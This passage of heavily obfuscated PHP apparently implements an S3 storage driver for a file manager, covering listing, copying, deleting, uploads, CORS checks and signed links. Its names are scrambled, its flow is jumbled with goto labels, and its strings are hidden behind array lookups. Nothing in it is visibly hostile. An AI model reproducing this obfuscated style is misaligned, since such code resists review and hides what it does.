$E¬’’ñ…á[$Bé¤â·óØ] : $this->size($Bé¤â·óØ); } $e¨ñŠ’ÊÑÕ[] = $dÒÊ°Š¢Ïæ; } return $e¨ñŠ’ÊÑÕ; goto f™ñˆœ»ª; dç¼ÕÛº°Š: $D¯•–©ò  = trim($D¯•–©ò , $AÈ«‡ğæÎ[8]); foreach ($d¦ôÊ‘©Ş³ as $aµ´Ìš™›Ò) { $E¬¹ÊòóæÎ = ltrim(substr($aµ´Ìš™›Ò, strlen($D¯•–©ò )), $AÈ«‡ğæÎ[8]); $e¯§â¼È™  = array_merge($e¯§â¼È™ , $this->slicePath($E¬¹ÊòóæÎ)); } $e¨ñŠ’ÊÑÕ = array(); goto CŠ¤«Ú’; DŞÆÁÚø½Â: $AÈ«‡ğæÎ =& $_SERVER[¿õñ]; if (empty($d¦ôÊ‘©Ş³)) { return array(); } $e¯§â¼È™  = array(); goto dç¼ÕÛº°Š; f™ñˆœ»ª: } public function slicePath($bù¹îŒ§Ù) { $CÁß…Ñ§‘Ÿ =& $_SERVER[¿õñ]; $e˜ê™ ˆä = explode($CÁß…Ñ§‘Ÿ[8], trim($bù¹îŒ§Ù, $CÁß…Ñ§‘Ÿ[8])); $fƒ£äÌˆ• = 0; do { ++$fƒ£äÌˆ•; $b«×ÙÔí[] = implode($CÁß…Ñ§‘Ÿ[8], array_slice($e˜ê™ ˆä, 0, $fƒ£äÌˆ•)) . $CÁß…Ñ§‘Ÿ[8]; } while ($fƒ£äÌˆ• < count($e˜ê™ ˆä)); $b«×ÙÔí[count($e˜ê™ ˆä) - 1] = $bù¹îŒ§Ù; return $b«×ÙÔí; } public function getHost() { $fĞ°¹¢¢…î =& $_SERVER[¿õñ]; $FƒãÛÊˆç = parse_url(trim($this->domain, $fĞ°¹¢¢…î[8])); $A‘‡ºÍçŸ‘ = isset($FƒãÛÊˆç[$fĞ°¹¢¢…î[165]]) ? $FƒãÛÊˆç[$fĞ°¹¢¢…î[165]] : http_type(); $d†ªê¨µØ = isset($FƒãÛÊˆç[$fĞ°¹¢¢…î[166]]) ? $FƒãÛÊˆç[$fĞ°¹¢¢…î[166]] : $FƒãÛÊˆç[$fĞ°¹¢¢…î[76]]; if (isset($FƒãÛÊˆç[$fĞ°¹¢¢…î[167]])) { $d†ªê¨µØ .= $fĞ°¹¢¢…î[4] . $FƒãÛÊˆç[$fĞ°¹¢¢…î[167]]; } return $A‘‡ºÍçŸ‘ . $fĞ°¹¢¢…î[168] . $d†ªê¨µØ; } public function pathEncode($Eªñé‹øÏ‰) { $E‚ë¡‹„ª‘ =& $_SERVER[¿õñ]; return str_replace($E‚ë¡‹„ª‘[169], $E‚ë¡‹„ª‘[8], rawurlencode($Eªñé‹øÏ‰)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public function __construct($CáË°™ÍÜÛ) { set_timeout(); require_once SDK_DIR . $_SERVER[¿õñ][170]; parent::__construct(); $this->_init($CáË°™ÍÜÛ); } public function _init($AÄÄ£ã¾Óœ) { foreach ($AÄÄ£ã¾Óœ as $FÁ˜ÒÙ”‰˜ => $a«…‘¬æß) { if (isset($this->{$FÁ˜ÒÙ”‰˜})) { $this->{$FÁ˜ÒÙ”‰˜} = $a«…‘¬æß; } } $this->endpoint = $AÄÄ£ã¾Óœ[$_SERVER[¿õñ][171]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); $this->client->setChunkSize($this->osChunkSize()); } public function signatureVersion($aÎæèÑ‘µš = "\x76\x34") { $this->signVer = $aÎæèÑ‘µš; $this->client->setSignatureVersion($aÎæèÑ‘µš); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto dœóäâ¦Ñ; A©ÁÛ§©›: $FèóùµÔã¤ = array($bé¨»ĞŞéØ[177], $bé¨»ĞŞéØ[178], $bé¨»ĞŞéØ[179], $bé¨»ĞŞéØ[180], $bé¨»ĞŞéØ[181]); $dàİÑó×… = array_diff($FèóùµÔã¤, $e´¥ø´¨½); return empty($dàİÑó×…); goto aà”‡Ôİâé; dœóäâ¦Ñ: $bé¨»ĞŞéØ =& $_SERVER[¿õñ]; $DÄé¸À¢ë = $this->getBucketCors(); if (!$DÄé¸À¢ë || !is_array($DÄé¸À¢ë)) { return !1; } goto d×ŒŞî ã; d×ŒŞî ã: if ($DÄé¸À¢ë[$bé¨»ĞŞéØ[172]] != $bé¨»ĞŞéØ[173] || $DÄé¸À¢ë[$bé¨»ĞŞéØ[174]] != $bé¨»ĞŞéØ[173]) { return !1; } $e´¥ø´¨½ = array_map($bé¨»ĞŞéØ[175], $DÄé¸À¢ë[$bé¨»ĞŞéØ[176]]); if (!is_array($e´¥ø´¨½)) { $e´¥ø´¨½ = array(); } goto A©ÁÛ§©›; aà”‡Ôİâé: } public function mkfile($fÀ¤¦ôŸˆß, $FùŠ‡×›ÊÀ = '', $D¡½Æ¸¬Ø¡ = REPEAT_RENAME) { $fö¬ïé‹…¬ = $this->setContent($fÀ¤¦ôŸˆß, $FùŠ‡×›ÊÀ); if ($fö¬ïé‹…¬ !== !1) { return $this->getPathOuter($fÀ¤¦ôŸˆß); } return !1; } public function mkdir($bóØàÒ½°Ô, $EŒŸ…ÁÜî… = REPEAT_SKIP) { if (empty($bóØàÒ½°Ô)) { return !1; } if ($this->_isFolder($bóØàÒ½°Ô)) { return $this->getPathOuter($bóØàÒ½°Ô); } $CŒÒš‡âö´ = $this->setContent($bóØàÒ½°Ô, $_SERVER[¿õñ][33], !0); if ($CŒÒš‡âö´ !== !1) { return $this->getPathOuter($bóØàÒ½°Ô); } return !1; } public function copyFile($AäÇÊ²œªƒ, $féøÄÇß„Ï, $Cåß¨ïàêØ = array()) { $Dµ‡ÊØÑÇ« =& $_SERVER[¿õñ]; $D—ïÅÇ’÷ = $this->objectMeta($AäÇÊ²œªƒ); if (!$D—ïÅÇ’÷) { return !1; } if ($D—ïÅÇ’÷[$Dµ‡ÊØÑÇ«[78]] <= 1024 * 1024 * 200) { $eŞ½„¨ñ•¹ = $this->client->copyObject($this->bucket, $AäÇÊ²œªƒ, $this->bucket, $féøÄÇß„Ï, $Dµ‡ÊØÑÇ«[182], $Cåß¨ïàêØ); } else { $eŞ½„¨ñ•¹ = $this->client->multiCopyObject($this->bucket, $AäÇÊ²œªƒ, $this->bucket, $féøÄÇß„Ï, $Cåß¨ïàêØ); } $eŞ½„¨ñ•¹ = $eŞ½„¨ñ•¹ ? $this->getPathOuter($féøÄÇß„Ï) : !1; return $eŞ½„¨ñ•¹; } public function moveFile($cœÕÀŒÜÙ, $fç‹íôÀßİ) { if ($this->copyFile($cœÕÀŒÜÙ, $fç‹íôÀßİ)) { $this->delFile($cœÕÀŒÜÙ); return $this->getPathOuter($fç‹íôÀßİ); } return !1; } public function delFile($D’ùùŒšá¬) { return $this->client->deleteObject($this->bucket, $D’ùùŒšá¬); } public function delFolder($d°ÌÁ´»„¿) { goto CÏÜèó„É; eÖƒ˜£³Ñˆ: return $eË½”ˆˆôà === $c»ù†ŠÒ“Ü ? !0 : !1; goto eÀ«ƒôÚ•§; CÏÜèó„É: $bÍÈãÁšî¸ =& $_SERVER[¿õñ]; $bˆ¸İ¨…«× = $this->listObjs($d°ÌÁ´»„¿); if (!$bˆ¸İ¨…«×) { $d°ÌÁ´»„¿ = trim($d°ÌÁ´»„¿, $bÍÈãÁšî¸[8]); if (!empty($d°ÌÁ´»„¿)) { $d°ÌÁ´»„¿ .= $bÍÈãÁšî¸[8]; } return $this->delFile($d°ÌÁ´»„¿); } goto f“ïõ„’å¢; f“ïõ„’å¢: $eË½”ˆˆôà = $c»ù†ŠÒ“Ü = 0; $DæÌ¼°¨½Ş = array_chunk(array_keys($bˆ¸İ¨…«×), 1000); foreach ($DæÌ¼°¨½Ş as $d‹©¤ÒŒÜ) { $eË½”ˆˆôà++; $c»ù†ŠÒ“Ü += (int) $this->client->deleteObjects($this->bucket, $d‹©¤ÒŒÜ); } goto eÖƒ˜£³Ñˆ; eÀ«ƒôÚ•§: } public function rename($EºÒ…ÇîæÚ, $C£éøÚñæç) { return $this->renameObject($EºÒ…ÇîæÚ, $C£éøÚñæç); } public function listPath($f±“íğÆ£ƒ, $A ‚àÕùÕø = false) { $fêø¶õ¨Ñˆ =& $_SERVER[¿õñ]; $B‰°½Ş¨ç— = $this->listObjs($f±“íğÆ£ƒ, null, null, $fêø¶õ¨Ñˆ[8]); $b†ËÜÍØ = array($fêø¶õ¨Ñˆ[75] => array(), $fêø¶õ¨Ñˆ[74] => array()); foreach ($B‰°½Ş¨ç— as $B§¿Ñ¶ø¯Ü => $dßÖ‚‘ˆäë) { if ($B§¿Ñ¶ø¯Ü == $fêø¶õ¨Ñˆ[8]) { continue; } if (isset($dßÖ‚‘ˆäë[$fêø¶õ¨Ñˆ[183]])) { $b†ËÜÍØ[$fêø¶õ¨Ñˆ[75]][] = $this->folderInfo($dßÖ‚‘ˆäë[$fêø¶õ¨Ñˆ[183]], $A ‚àÕùÕø); } else { if (substr($dßÖ‚‘ˆäë[$fêø¶õ¨Ñˆ[28]], -1) == $fêø¶õ¨Ñˆ[8]) { continue; } $b†ËÜÍØ[$fêø¶õ¨Ñˆ[74]][] = $this->fileInfo($dßÖ‚‘ˆäë[$fêø¶õ¨Ñˆ[28]], $A ‚àÕùÕø, $dßÖ‚‘ˆäë); } } return $b†ËÜÍØ; } private function fileInfo($D³ÑÖ‚Øç¢, $A¥½§Ö¨‡‚ = false, $F¢Æƒğ£¾ = array()) { goto eù¥ÊÍØ·; eù¥ÊÍØ·: $dÈÛÇ„ƒîÛ =& $_SERVER[¿õñ]; if ($A¥½§Ö¨‡‚) { return array($dÈÛÇ„ƒîÛ[28] => $this->pathThis($D³ÑÖ‚Øç¢), $dÈÛÇ„ƒîÛ[76] => $this->getPathOuter($D³ÑÖ‚Øç¢), $dÈÛÇ„ƒîÛ[29] => $dÈÛÇ„ƒîÛ[164], $dÈÛÇ„ƒîÛ[157] => $this->ext($D³ÑÖ‚Øç¢), $dÈÛÇ„ƒîÛ[78] => isset($F¢Æƒğ£¾[$dÈÛÇ„ƒîÛ[78]]) ? $F¢Æƒğ£¾[$dÈÛÇ„ƒîÛ[78]] : 0, $dÈÛÇ„ƒîÛ[184] => $dÈÛÇ„ƒîÛ[50], $dÈÛÇ„ƒîÛ[106] => $dÈÛÇ„ƒîÛ[50], $dÈÛÇ„ƒîÛ[185] => !0, $dÈÛÇ„ƒîÛ[186] => !0); } $AÕôšŒ¨‰ = array($dÈÛÇ„ƒîÛ[28] => $this->pathThis($D³ÑÖ‚Øç¢), $dÈÛÇ„ƒîÛ[76] => $this->getPathOuter($D³ÑÖ‚Øç¢), $dÈÛÇ„ƒîÛ[29] => $dÈÛÇ„ƒîÛ[164], $dÈÛÇ„ƒîÛ[184] => $dÈÛÇ„ƒîÛ[50], $dÈÛÇ„ƒîÛ[106] => $dÈÛÇ„ƒîÛ[50], $dÈÛÇ„ƒîÛ[78] => 0, $dÈÛÇ„ƒîÛ[157] => $this->ext($D³ÑÖ‚Øç¢), $dÈÛÇ„ƒîÛ[185] => !0, $dÈÛÇ„ƒîÛ[186] => !0); goto E•Ë÷¶©ö; FÅ¨Ú¬¶¦¦: return $AÕôšŒ¨‰; goto bôÊ­­è¤; E•Ë÷¶©ö: if (empty($F¢Æƒğ£¾)) { $F¢Æƒğ£¾ = $this->objectMeta($D³ÑÖ‚Øç¢); if (!$F¢Æƒğ£¾) { return $AÕôšŒ¨‰; } } if (isset($F¢Æƒğ£¾[$dÈÛÇ„ƒîÛ[187]])) { $AÕôšŒ¨‰[$dÈÛÇ„ƒîÛ[106]] = $F¢Æƒğ£¾[$dÈÛÇ„ƒîÛ[187]]; } if (isset($F¢Æƒğ£¾[$dÈÛÇ„ƒîÛ[78]])) { $AÕôšŒ¨‰[$dÈÛÇ„ƒîÛ[78]] = $F¢Æƒğ£¾[$dÈÛÇ„ƒîÛ[78]]; } goto FÅ¨Ú¬¶¦¦; bôÊ­­è¤: } private function folderInfo($cŠÂöµíÆÜ, $E¤”Í«Ø§² = false) { goto EŒçä¼¾ÙÚ; B“çóÙÒÔ†: if (!$E´²áÓË’•) { return $d¨Œˆˆ££²; } if (isset($Aó²‡Õñ‰[$EÂ˜öÓ‚¹÷[187]])) { $d¨Œˆˆ££²[$EÂ˜öÓ‚¹÷[184]] = $Aó²‡Õñ‰[$EÂ˜öÓ‚¹÷[187]]; } return $d¨Œˆˆ££²; goto a«‘Ñ•™—Â; d¬®é¼‰êß: if ($cŠÂöµíÆÜ == $EÂ˜öÓ‚¹÷[33]) { return $d¨Œˆˆ££²; } $cŠÂöµíÆÜ = trim($cŠÂöµíÆÜ, $EÂ˜öÓ‚¹÷[8]) . $EÂ˜öÓ‚¹÷[8]; $E´²áÓË’• = $this->objectMeta($cŠÂöµíÆÜ); goto B“çóÙÒÔ†; EŒçä¼¾ÙÚ: $EÂ˜öÓ‚¹÷ =& $_SERVER[¿õñ]; if ($E¤”Í«Ø§²) { return array($EÂ˜öÓ‚¹÷[28] => $this->pathThis($cŠÂöµíÆÜ), $EÂ˜öÓ‚¹÷[76] => $this->getPathOuter($EÂ˜öÓ‚¹÷[8] . $cŠÂöµíÆÜ), $EÂ˜öÓ‚¹÷[29] => $EÂ˜öÓ‚¹÷[77], $EÂ˜öÓ‚¹÷[185] => !0, $EÂ˜öÓ‚¹÷[186] => !0); } $d¨Œˆˆ££² = array($EÂ˜öÓ‚¹÷[28] => $this->pathThis($cŠÂöµíÆÜ), $EÂ˜öÓ‚¹÷[76] => $this->getPathOuter($EÂ˜öÓ‚¹÷[8] . $cŠÂöµíÆÜ), $EÂ˜öÓ‚¹÷[29] => $EÂ˜öÓ‚¹÷[77], $EÂ˜öÓ‚¹÷[184] => $EÂ˜öÓ‚¹÷[50], $EÂ˜öÓ‚¹÷[106] => $EÂ˜öÓ‚¹÷[50], $EÂ˜öÓ‚¹÷[185] => !0, $EÂ˜öÓ‚¹÷[186] => !0); goto d¬®é¼‰êß; a«‘Ñ•™—Â: } public function listObjs($FŠ†¤Ö“Õ, $d‹‚®ªÛÊ = null, $F§×­Å˜…Ë = null, $D£òæ“”ö = null) { $CããÜ‡ ”ä =& $_SERVER[¿õñ]; $FŠ†¤Ö“Õ = trim($FŠ†¤Ö“Õ, $CããÜ‡ ”ä[8]); $BÑ½ ÜŞÈ = empty($FŠ†¤Ö“Õ) ? $CããÜ‡ ”ä[33] : $FŠ†¤Ö“Õ . $CããÜ‡ ”ä[8]; return $this->client->getBucket($this->bucket, $BÑ½ ÜŞÈ, $d‹‚®ªÛÊ, $F§×­Å˜…Ë, $D£òæ“”ö, !0); } public function has($b÷ƒ—¶¤…, $AÜ¢åÚ›ö¸ = false, $f£êµá†ïù = true) { goto EË‰Òå§±; c­˜‹¦èóÇ: if ($AÜ¢åÚ›ö¸) { return array($bƒÎØÓä[188] => $c¶™„†·³É, $bƒÎØÓä[189] => $F­µàµŒéÏ); } return !1; goto BĞ•”˜ñÚ‘; EË‰Òå§±: $bƒÎØÓä =& $_SERVER[¿õñ]; $c¶™„†·³É = 0; $F­µàµŒéÏ = 0; goto a‰ï§Ÿ¹Ó; a‰ï§Ÿ¹Ó: $b™±é¦á´ = $this->listObjs($b÷ƒ—¶¤…, null, null, $bƒÎØÓä[8]); $b™±é¦á´ = is_array($b™±é¦á´) ? $b™±é¦á´ : array(); foreach ($b™±é¦á´ as $A¤¹¥Å¾ŸÃ) { if (isset($A¤¹¥Å¾ŸÃ[$bƒÎØÓä[28]]) && substr($A¤¹¥Å¾ŸÃ[$bƒÎØÓä[28]], -1) != $bƒÎØÓä[8]) { if (!$AÜ¢åÚ›ö¸ && $f£êµá†ïù) { return !0; } $c¶™„†·³É++; } else { if (isset($A¤¹¥Å¾ŸÃ[$bƒÎØÓä[183]])) { if (!$AÜ¢åÚ›ö¸ && !$f£êµá†ïù) { return !1; } $F­µàµŒéÏ++; } } } goto c­˜‹¦èóÇ; BĞ•”˜ñÚ‘: } public function listAll($aÛ¿î‹£) { $fè½”Öù¡ =& $_SERVER[¿õñ]; $c¿Íô¸È¶á = $this->listObjs($aÛ¿î‹£); $dˆï· á…Ç = $f±ê¥öÊó = array(); foreach ($c¿Íô¸È¶á as $e¸šç£±§İ => $fÂ³‚ŒŠ­) { $dˆï· á…Ç[] = $fÂ³‚ŒŠ­[$fè½”Öù¡[28]]; $f±ê¥öÊó[$e¸šç£±§İ] = $fÂ³‚ŒŠ­[$fè½”Öù¡[78]]; } return $this->listAllFiles($aÛ¿î‹£, $dˆï· á…Ç, $f±ê¥öÊó); } public function canRead($DÏ¦Ì±æ‰Ù) { $F¥ÇÕ–İƒä =& $_SERVER[¿õñ]; $Bõ²ó·Ÿãí = $this->client->getAccessControlPolicy($this->bucket, $DÏ¦Ì±æ‰Ù); if (!$Bõ²ó·Ÿãí) { return !1; } return in_array($Bõ²ó·Ÿãí, array($F¥ÇÕ–İƒä[190], $F¥ÇÕ–İƒä[191], $F¥ÇÕ–İƒä[192])) ? !0 : !1; } public function canWrite($fÉ‚ö‹³»¶) { $F¹¤ÀŠŠÕî =& $_SERVER[¿õñ]; $bĞéŸ’´‚” = $this->client->getAccessControlPolicy($this->bucket, $fÉ‚ö‹³»¶); if (!$bĞéŸ’´‚”) { return !1; } return in_array($bĞéŸ’´‚”, array($F¹¤ÀŠŠÕî[190], $F¹¤ÀŠŠÕî[191])) ? !0 : !1; } public function getContent($A¤Î·ÈÏÈ£) { return $this->client->getObject($this->bucket, $A¤Î·ÈÏÈ£); } public function setContent($aÎÚ«áÎøæ, $DÂ½Ÿº±ï = '', $dÚ„ì‚ºé = false) { goto AæÍÖšëÈ; F ŠºÕÄ¸¯: $AÙŒíæÀ‚¹ = $this->copyFile($aÎÚ«áÎøæ, $aÎÚ«áÎøæ, array($F³Š¶ª¯×š[193] => $AÙŒíæÀ‚¹[$F³Š¶ª¯×š[194]])); return $AÙŒíæÀ‚¹ ? !0 : !1; goto c®ï¬èµÏæ; AæÍÖšëÈ: $F³Š¶ª¯×š =& $_SERVER[¿õñ]; $aÎÚ«áÎøæ = $dÚ„ì‚ºé ? trim($aÎÚ«áÎøæ, $F³Š¶ª¯×š[8]) . $F³Š¶ª¯×š[8] : $aÎÚ«áÎøæ; $Eº¸ùÈÈéŠ = get_file_mime(get_path_ext($aÎÚ«áÎøæ)); goto A¨‹ù¼íÜå; A¨‹ù¼íÜå: $AÙŒíæÀ‚¹ = $this->client->putObject($DÂ½Ÿº±ï, $this->bucket, $aÎÚ«áÎøæ, $F³Š¶ª¯×š[182], array(), $Eº¸ùÈÈéŠ); if (!$AÙŒíæÀ‚¹) { return !1; } if ($dÚ„ì‚ºé) { return !0; } goto F ŠºÕÄ¸¯; c®ï¬èµÏæ: } public function fileSubstr($cëª®äÏÇò, $F½›…ˆ‡Ş÷, $f±’„‚Õù) { $e‹Ÿ²øù±… = $F½›…ˆ‡Ş÷ + $f±’„‚Õù - 1; return $this->client->getObject($this->bucket, $cëª®äÏÇò, array($_SERVER[¿õñ][195] => "\x62\171\164\x65\163\x3d{$F½›…ˆ‡Ş÷}\55{$e‹Ÿ²øù±…}")); } public function upload($Cá„«–‹ï, $c˜ñ³Ş¾©ø, $EÁ×©³‡¶Ê = false, $C¹ëßêâ = REPEAT_REPLACE) { $b¹á‡Ü…á„ =& $_SERVER[¿õñ]; $B®ÂÕé‘Â” = array($b¹á‡Ü…á„[193] => @md5_file($c˜ñ³Ş¾©ø)); $a³˜µ„Í®° = array($b¹á‡Ü…á„[196] => get_file_mime(get_path_ext($Cá„«–‹ï))); if (IO::size($c˜ñ³Ş¾©ø) <= 1024 * 1024 * 200) { $F’îîÎš¹© = $this->client->putObjectFile($c˜ñ³Ş¾©ø, $this->bucket, $Cá„«–‹ï, $b¹á‡Ü…á„[182], $B®ÂÕé‘Â”, $a³˜µ„Í®°); return !empty($F’îîÎš¹©) ? $this->getPathOuter($Cá„«–‹ï) : !1; } $eïŸğ˜ç¼õ = $this->client->multiUploadObject($c˜ñ³Ş¾©ø, $this->bucket, trim($Cá„«–‹ï, $b¹á‡Ü…á„[8]), $B®ÂÕé‘Â”, $a³˜µ„Í®°); return $eïŸğ˜ç¼õ ? $this->getPathOuter($Cá„«–‹ï) : !1; } public function download($cï§ø‰÷‹ˆ, $D¶ÌÚ) { if (!@is_dir($this->pathFather($D¶ÌÚ)) && !IO::mkdir($this->pathFather($D¶ÌÚ))) { return !1; } $EÓø’÷»åÍ = $this->client->getObject($this->bucket, $cï§ø‰÷‹ˆ, array(), $D¶ÌÚ); return $EÓø’÷»åÍ !== !1 ? $D¶ÌÚ : !1; } public function link($e é–„Ò™Ë, $c‰ö³Ğˆ† = array()) { $fçÇğ¤ğƒ =& $_SERVER[¿õñ]; if ($this->signVer == $fçÇğ¤ğƒ[197]) { return $this->client->getAuthenticatedURL($this->bucket, $e é–„Ò™Ë, 3600 * 12, $c‰ö³Ğˆ†); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($e é–„Ò™Ë, $fçÇğ¤ğƒ[8]), 3600 * 12, $this->region, array(), !0, $c‰ö³Ğˆ†); } public function fileOut($e±’ËõÑ¤å, $AÖ¤†ÌÍ— = false, $dÍØªè©Ã = false, $F°‚ÕğÈÀä = '') { goto bùˆ´¾·â; F»®¼Û“©—: if ($e”¤½ÉÙéÍ == $eÂ’×¥Ú’Ø[198]) { return parent::fileOut($e±’ËõÑ¤å, $AÖ¤†ÌÍ—, $dÍØªè©Ã, $F°‚ÕğÈÀä); } $AÖ¤†ÌÍ— = $AÖ¤†ÌÍ— ? $eÂ’×¥Ú’Ø[199] : $eÂ’×¥Ú’Ø[200]; $CÎÄï–òœÂ = array($eÂ’×¥Ú’Ø[201] => $AÖ¤†ÌÍ— . $eÂ’×¥Ú’Ø[202] . rawurlencode($dÍØªè©Ã), $eÂ’×¥Ú’Ø[203] => $e”¤½ÉÙéÍ); goto c§™Ú¹Óâ«; bùˆ´¾·â: $eÂ’×¥Ú’Ø =& $_SERVER[¿õñ]; if (!$dÍØªè©Ã) { $dÍØªè©Ã = $this->pathThis($e±’ËõÑ¤å); } $e”¤½ÉÙéÍ = get_file_mime(get_path_ext($dÍØªè©Ã)); goto F»®¼Û“©—; c§™Ú¹Óâ«: $Bªàä‡„¨ß = $this->link($e±’ËõÑ¤å, $CÎÄï–òœÂ); $this->fileOutLink($Bªàä‡„¨ß); goto fĞ–‹¦ÇÁÀ; fĞ–‹¦ÇÁÀ: } public function fileOutServer($cóŸ‘ÕİÍğ, $d»¥ò¯è¾ = false, $eô•¼™Ù = false, $f»…ÕÑÓ± = '') { parent::fileOut($cóŸ‘ÕİÍğ, $d»¥ò¯è¾, $eô•¼™Ù, $f»…ÕÑÓ±); } public function fileOutImage($D•ƒ‰‰×Á, $dÙˆ‡¯Ñ®Æ = 250) { $DÎæã—ŞŞ = $this->link($D•ƒ‰‰×Á); $this->fileOutLink($DÎæã—ŞŞ); } public function fileOutImageServer($fáØÜ‘Ô‘, $F¶éæƒñ®É = 250) { parent::fileOutImage($fáØÜ‘Ô‘, $F¶éæƒñ®É); } public function hashMd5($C×…´Ç‘Ï, $aÓœñ‚÷ = '') { $bÔŞµäÈ–ã =& $_SERVER[¿õñ]; $E¾œ¥ƒ¡å± = $this->objectMeta($C×…´Ç‘Ï); if (!$E¾œ¥ƒ¡å±) { return !1; } $aÓœñ‚÷ = $aÓœñ‚÷ ? $aÓœñ‚÷ : _get($E¾œ¥ƒ¡å±, $bÔŞµäÈ–ã[204]); $aÓœñ‚÷ = $aÓœñ‚÷ ? $aÓœñ‚÷ : _get($E¾œ¥ƒ¡å±, $bÔŞµäÈ–ã[194], $bÔŞµäÈ–ã[33]); return $aÓœñ‚÷; } public function uploadFormData($DÉ‚ò‘§¡, $dîŸÊ¨ŞÌÇ = 3600) { $BÜ´¦‹µ¡Œ =& $_SERVER[¿õñ]; $b“Ö·ïëÖÉ = $this->pathFather($DÉ‚ò‘§¡); $D•Ó…Š›Å³ = $this->client->getHttpUploadPostParams($this->bucket, $b“Ö·ïëÖÉ, $BÜ´¦‹µ¡Œ[182], $dîŸÊ¨ŞÌÇ); return array_merge((array) $D•Ó…Š›Å³, array($BÜ´¦‹µ¡Œ[166] => $this->getHost())); } public function multiUploadFormData($c‡˜ì÷›Ùä, $dÁ…ÜµÖ“Æ = 3600) { $B·¸’’¦ =& $_SERVER[¿õñ]; $E‡¹«Ö…±Æ = gmdate($B·¸’’¦[205]); $D¨ÆğÌï½ = array(); $FğÔ×Ï…Ø³ = $this->client->getUploadId($this->bucket, $c‡˜ì÷›Ùä, $D¨ÆğÌï½); if (!$FğÔ×Ï…Ø³) { return !1; } return array($B·¸’’¦[206] => $FğÔ×Ï…Ø³, $B·¸’’¦[166] => $this->getHost() . $B·¸’’¦[8] . $this->pathEncode($c‡˜ì÷›Ùä), $B·¸’’¦[207] => $E‡¹«Ö…±Æ, $B·¸’’¦[88] => $c‡˜ì÷›Ùä); } public function multiUploadAuthData($D‡Í£‡¸§, $d¸²äæ› = array()) { goto FÅàÕ§Íë¹; F‘Ü¹šî¤¬: if (isset($d¸²äæ›[$C¿£¼¥¼Ä¡[208]])) { return $this->listUploadParts($fÇ¸¶Æ‹ç, $d¸²äæ›); } $BÖ«Ü÷¦íÛ = array($C¿£¼¥¼Ä¡[209], $C¿£¼¥¼Ä¡[33], $C¿£¼¥¼Ä¡[115], $C¿£¼¥¼Ä¡[33], "\170\55\141\155\x7a\x2d\144\x61\164\145\x3a{$c²Ø•–äĞ¢}", $C¿£¼¥¼Ä¡[8] . $this->bucket . $C¿£¼¥¼Ä¡[8] . $this->pathEncode($fÇ¸¶Æ‹ç) . $cÓ·ˆíæÑ³); if (strpos($cÓ·ˆíæÑ³, $C¿£¼¥¼Ä¡[210]) === 0) { $BÖ«Ü÷¦íÛ[0] = $C¿£¼¥¼Ä¡[211]; } goto Bµ‹šÕ½ºö; Bµ‹šÕ½ºö: if (isset($d¸²äæ›[$C¿£¼¥¼Ä¡[212]]) && $d¸²äæ›[$C¿£¼¥¼Ä¡[212]] == $C¿£¼¥¼Ä¡[213]) { $BÖ«Ü÷¦íÛ[0] = $C¿£¼¥¼Ä¡[213]; } $c›èÅá˜ã = implode($C¿£¼¥¼Ä¡[214], $BÖ«Ü÷¦íÛ); $bªäŸÕ¸ç = base64_encode(hash_hmac($C¿£¼¥¼Ä¡[215], $c›èÅá˜ã, $this->secret, !0)); goto EæĞ³·ÅË˜; FÅàÕ§Íë¹: $C¿£¼¥¼Ä¡ =& $_SERVER[¿õñ]; $c²Ø•–äĞ¢ = isset($d¸²äæ›[$C¿£¼¥¼Ä¡[207]]) ? $d¸²äæ›[$C¿£¼¥¼Ä¡[207]] : gmdate($C¿£¼¥¼Ä¡[205]); $d¸²äæ›[$C¿£¼¥¼Ä¡[207]] = $c²Ø•–äĞ¢; goto AÒï‹ŒÚ¡; AÒï‹ŒÚ¡: $cÓ·ˆíæÑ³ = isset($d¸²äæ›[$C¿£¼¥¼Ä¡[157]]) ? $d¸²äæ›[$C¿£¼¥¼Ä¡[157]] : $C¿£¼¥¼Ä¡[33]; $fÇ¸¶Æ‹ç = $d¸²äæ›[$C¿£¼¥¼Ä¡[88]]; unset($d¸²äæ›[$C¿£¼¥¼Ä¡[88]]); goto F‘Ü¹šî¤¬; EæĞ³·ÅË˜: $fÂ®—¨‹à¬ = $C¿£¼¥¼Ä¡[216] . $this->accessKey . $C¿£¼¥¼Ä¡[4] . $bªäŸÕ¸ç; if (strpos($cÓ·ˆíæÑ³, $C¿£¼¥¼Ä¡[210]) === 0) { return array($C¿£¼¥¼Ä¡[217] => $fÂ®—¨‹à¬, $C¿£¼¥¼Ä¡[207] => $c²Ø•–äĞ¢); } return $fÂ®—¨‹à¬; goto FµêßÈÖĞ‚; FµêßÈÖĞ‚: } public function listUploadParts($BàÙ¾áš¥, $B•¯Ï½Çª = array()) { goto DÜ§”…±ë’; c÷»«š°™: if (!$eí‚©Š±¿) { return !1; } unset($B•¯Ï½Çª[$Fã„¤Ÿ¼Õ[208]], $B•¯Ï½Çª[$Fã„¤Ÿ¼Õ[212]]); $B•¯Ï½Çª[$Fã„¤Ÿ¼Õ[88]] = $BàÙ¾áš¥; goto EËğ³¼ºÖÈ; EËğ³¼ºÖÈ: $Dªç·ó­¿ = $this->multiUploadAuthData($BàÙ¾áš¥, $B•¯Ï½Çª); if (empty($Dªç·ó­¿)) { return !1; } return array($Fã„¤Ÿ¼Õ[217] => $Dªç·ó­¿, $Fã„¤Ÿ¼Õ[207] => $B•¯Ï½Çª[$Fã„¤Ÿ¼Õ[207]], $Fã„¤Ÿ¼Õ[219] => $eí‚©Š±¿); goto Bİó«¿İŠ; DÜ§”…±ë’: $Fã„¤Ÿ¼Õ =& $_SERVER[¿õñ]; $f¸èéó«Ü = str_replace($Fã„¤Ÿ¼Õ[218], $Fã„¤Ÿ¼Õ[33], $B•¯Ï½Çª[$Fã„¤Ÿ¼Õ[157]]); $eí‚©Š±¿ = $this->client->listParts($this->bucket, $BàÙ¾áš¥, $f¸èéó«Ü); goto c÷»«š°™; Bİó«¿İŠ: } public function getHost() { return parent::getHost() . $_SERVER[¿õñ][8] . $this->bucket; } public function size($c¿Ä¼êêøæ) { $fÇï’á¹ğö = $this->objectMeta($c¿Ä¼êêøæ); return $fÇï’á¹ğö ? 